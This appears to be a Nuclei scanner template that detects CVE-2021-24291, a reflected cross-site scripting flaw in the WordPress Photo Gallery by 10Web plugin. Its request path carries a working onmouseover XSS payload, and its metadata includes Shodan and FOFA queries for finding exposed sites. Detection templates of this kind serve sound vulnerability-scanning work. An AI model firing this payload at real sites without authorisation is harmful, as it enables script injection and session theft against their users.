http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - condition: and
    type: word
    words:
    - onmouseover=alert(document.domain)//
    - wp-content/uploads/photo-gallery
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//'
id: CVE-2021-24291
info:
  author: geeknik
  classification:
    cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24291
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94239
    epss-score: 0.14622
  description: 'WordPress Photo Gallery by 10Web plugin before 1.5.69 contains multiple
    reflected cross-site scripting vulnerabilities via the gallery_id, tag, album_id
    and theme_id GET parameters passed to the bwg_frontend_data AJAX action, available
    to both unauthenticated and authenticated users.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/photo-gallery
    framework: wordpress
    max-request: 1
    product: photo_gallery
    publicwww-query: /wp-content/plugins/photo-gallery
    shodan-query: http.html:/wp-content/plugins/photo-gallery
    vendor: 10web
  name: WordPress Photo Gallery by 10Web <1.5.69 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/cfb982b2-8b6d-4345-b3ab-3d2b130b873a
  - https://packetstormsecurity.com/files/162227/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24291
  remediation: 'Update WordPress Photo Gallery by 10Web to version 1.5.69 or later
    to mitigate the vulnerability.

    '
  severity: medium
  tags: cve2021,cve,photo,wpscan,packetstorm,xss,wordpress,wp-plugin,10web,vuln
